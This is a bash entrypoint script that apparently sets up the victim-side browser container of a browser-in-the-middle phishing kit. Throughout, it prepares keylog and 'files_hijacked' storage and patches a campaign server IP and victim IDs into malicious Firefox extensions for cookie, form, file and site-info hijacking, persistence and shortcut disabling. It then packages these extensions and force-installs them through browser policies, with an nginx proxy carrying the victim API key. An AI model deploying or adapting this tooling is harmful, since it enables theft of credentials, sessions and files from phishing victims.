#!/bin/bash
set -euo pipefail

fail_invalid_env() {
    echo "Invalid victim container environment: $1" >&2
    exit 1
}

require_identifier() {
    [[ -n "$2" && "$2" =~ ^[A-Za-z0-9_-]+$ ]] \
        || fail_invalid_env "$1"
}

require_host() {
    [[ -n "$2" && "$2" =~ ^[A-Za-z0-9.:_-]+$ ]] \
        || fail_invalid_env "$1"
}

require_identifier "CAMPAIGN_ID" "$CAMPAIGN_ID"
require_identifier "VICTIM_ID" "$VICTIM_ID"
require_identifier "VICTIM_API_KEY" "$VICTIM_API_KEY"
require_host "IP" "$IP"
[[ "$THEME" == "light" || "$THEME" == "dark" || "$THEME" == "unknown" ]] \
    || fail_invalid_env "THEME"

IFS=',' read -ra EXT_ARR <<< "$EXTENSIONS"
for EXT in "${EXT_ARR[@]}"; do
    require_identifier "EXTENSIONS entry" "$EXT"
done

# Selkies Config
export DISPLAY=:1
storage_uid="${PUID:-1000}"
storage_gid="${PGID:-1000}"
[[ "$storage_uid" =~ ^[1-9][0-9]*$ ]] || fail_invalid_env "PUID"
[[ "$storage_gid" =~ ^[1-9][0-9]*$ ]] || fail_invalid_env "PGID"

# The LinuxServer init remaps `abc` to PUID/PGID after this entrypoint hands
# control to s6. Prepare the bind mount with those numeric IDs now so the
# desktop user and the UID 1000 backend can both access session artifacts.
install -d -o "$storage_uid" -g "$storage_gid" -m 0700 /storage
install -d -o "$storage_uid" -g "$storage_gid" -m 0700 \
    /storage/files_hijacked
for keylog_path in /storage/keylogs.txt /storage/keylogs.previous.txt; do
    if [ -L "$keylog_path" ] || { [ -e "$keylog_path" ] && [ ! -f "$keylog_path" ]; }; then
        fail_invalid_env "unsafe keylog storage path"
    fi
    if [ -f "$keylog_path" ]; then
        chown "$storage_uid:$storage_gid" "$keylog_path"
        chmod 0644 "$keylog_path"
    fi
done

if [ "$THEME" == "light" ]; then
    sed -i "s|THEME|0|g" /config/.mozilla/firefox/bitm-profile/user.js
else
    sed -i "s|THEME|1|g" /config/.mozilla/firefox/bitm-profile/user.js
fi
sed -i "s|CAMPAIGN_ID|$CAMPAIGN_ID|g" /config/.mozilla/firefox/bitm-profile/user.js

sed -i "s|SERVER_IP|$IP/$CAMPAIGN_ID|g" /bitm/app/bad_firefox_extensions/file-hijacking/background.js
sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/file-hijacking/background.js

sed -i "s|SERVER_IP|$IP/$CAMPAIGN_ID|g" /bitm/app/bad_firefox_extensions/site-info-hijacking/background.js
sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/site-info-hijacking/background.js

sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/form-interceptor/background.js

sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/cookie-hijacking/background.js

cd /bitm/app/bad_firefox_extensions/file-hijacking/ && zip -r ../file-hijacking.xpi *
cd /bitm/app/bad_firefox_extensions/persistence/ && zip -r ../persistence.xpi *
cd /bitm/app/bad_firefox_extensions/disable-shortcuts/ && zip -r ../disable-shortcuts.xpi *
cd /bitm/app/bad_firefox_extensions/site-info-hijacking/ && zip -r ../site-info-hijacking.xpi *
cd /bitm/app/bad_firefox_extensions/form-interceptor/ && zip -r ../form-interceptor.xpi *
cd /bitm/app/bad_firefox_extensions/cookie-hijacking/ && zip -r ../cookie-hijacking.xpi *

# Select the debug-friendly policy in development/default mode while retaining
# the hardened policy in kiosk mode. Then inject extensions as structured JSON.
POLICIES_FILE=/etc/firefox/policies/policies.json
if [ "${MODE:-}" = "default" ]; then
    POLICIES_SOURCE="${POLICIES_FILE}.dev"
else
    POLICIES_SOURCE="${POLICIES_FILE}.prod"
fi
cp "$POLICIES_SOURCE" "$POLICIES_FILE"
POLICIES_TMP=$(mktemp "${POLICIES_FILE}.XXXXXX")
trap 'rm -f "$POLICIES_TMP"' EXIT
EXTENSION_PATHS=()
for EXT in "${EXT_ARR[@]}"; do
    EXTENSION_PATH="/bitm/app/bad_firefox_extensions/${EXT}.xpi"
    [[ -f "$EXTENSION_PATH" ]] || fail_invalid_env "missing extension: $EXT"
    EXTENSION_PATHS+=("$EXTENSION_PATH")
done
if ((${#EXTENSION_PATHS[@]})); then
    EXTENSIONS_JSON=$(printf '%s\n' "${EXTENSION_PATHS[@]}" | jq -R . | jq -s .)
else
    EXTENSIONS_JSON='[]'
fi
jq --argjson installs "$EXTENSIONS_JSON" \
    '.policies.Extensions.Install = $installs' \
    "$POLICIES_FILE" > "$POLICIES_TMP"
chmod 0644 "$POLICIES_TMP"
mv "$POLICIES_TMP" "$POLICIES_FILE"
trap - EXIT


sed -i "s|CAMPAIGN_IP|$IP|g" /etc/nginx/conf.d/local-proxy.conf
sed -i "s|CAMPAIGN_ID|$CAMPAIGN_ID|g" /etc/nginx/conf.d/local-proxy.conf
sed -i "s|VICTIM_API_KEY|$VICTIM_API_KEY|g" /etc/nginx/conf.d/local-proxy.conf

exec /init
